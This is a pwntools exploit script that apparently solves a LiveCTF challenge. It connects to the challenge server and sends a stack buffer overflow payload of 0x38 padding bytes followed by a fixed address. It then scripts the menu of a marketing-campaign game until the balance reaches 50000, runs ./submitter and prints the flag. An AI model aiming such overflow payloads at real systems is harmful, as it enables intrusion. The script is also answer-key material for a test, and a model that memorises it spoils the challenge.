import argparse
import sys
import base64

from tqdm import tqdm
from pwn import *

context.terminal = ['tmux', 'splitw', '-v']
context.log_level = 'info'
context.arch='amd64'


PATH = "/solve/handout/challenge"
# LIBC = "/handout/libc.so.6"
# LD = "/handout/ld-linux-x86-64.so.2"
# e = ELF(PATH)
# libc = ELF(LIBC)

network = len(sys.argv) > 1

if network:
    parser = argparse.ArgumentParser()
    default_addr = os.environ.get("HOST", "127.0.0.1") + ":" + os.environ.get("PORT", "31337")
    parser.add_argument("--network", action='store_true')
    parser.add_argument("address", default=default_addr,
                        nargs="?", help="Address of challenge")
    args = parser.parse_args()
    HOST, PORT = args.address.split(':')

    r = remote(HOST, int(PORT))
else:
    assert False
    # r = process(PATH)
#     r = gdb.debug(PATH, f'''
# file {PATH}
# c
# ''')

r.sendline(b'a'*0x38 + p32(0x4015ea))

# make agent
r.sendline(b'd')
r.sendline(b'h')
r.sendline(b'agent name')
r.sendline(b'x')

# make campaigns
r.sendline(b'a')

# r.sendline(b'c')
# r.sendline(b'campaign name')
# budget = 300
# r.sendline(f"{budget}".encode())
# r.recvuntil(b'Select region (1-5):\n')
# r.sendline(f'{best_region}'.encode())
# r.sendline(b'0')
# r.sendline(b'1')
# r.sendline(b'good')
# r.sendline(b'product')
# r.sendline(b'please')
# r.sendline(b'buy')
# r.sendline(b'it')

budget = 1

for i in range(5):
    r.sendline(b'c')
    r.sendline(b'campaign name')

    r.sendline(f"{1}".encode())

    r.recvuntil(b'Select region (1-5):\n')
    r.sendline(f'{i+1}'.encode())
    r.sendline(b'0')
    r.sendline(b'1')
    r.sendline(b'good')
    r.sendline(b'product')
    r.sendline(b'please')
    r.sendline(b'buy')
    r.sendline(b'it')

r.sendline(b'x')
r.sendline(b'n')

r.recvuntil(b"===== Day 1 Results =====")

regions = []
for i in range(5):
    r.recvuntil(b"Region ")
    reg = r.recvuntil(b" ")[:-1]
    r.recvuntil(b"increased revenue by ")
    by = int(r.recvuntil(b"%")[:-1])

    regions.append((i, reg, by))

r.recvuntil(b"New Balance: $")
extra = int(r.recvuntil(b"\n"))
print(f"{extra=}")

best_region = max(regions, key=lambda r: r[2])
print(f"{regions=}")
print(f"{best_region=}")

r.sendline(b"a")
for i in range(5):
    if best_region[0] != i:
        r.sendline(b"p")
        r.sendline(f"{i+1}".encode())
r.sendline(b"x")

for i in range(8):
    r.sendline(b'a')
    r.sendline(b'e')
    r.sendline(f'{best_region[0]+1}'.encode())

    r.recvuntil(b'current: $')
    new_budget = int(r.recvuntil(b")")[:-1])
    print(f"{new_budget=}")

    new_budget += extra
    print(f"{new_budget=}")

    r.sendline(f"{new_budget}".encode())
    r.sendline(b'n')
    r.sendline(b'n')
    r.sendline(b'x')

    r.sendline(b'n')

    r.recvuntil(b"New Balance: $")
    extra = int(r.recvuntil(b"\n"))
    print(f"{extra=}")

    if extra >= 50000:
        break

    # r.interactive()

r.sendline(b"./submitter")

flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)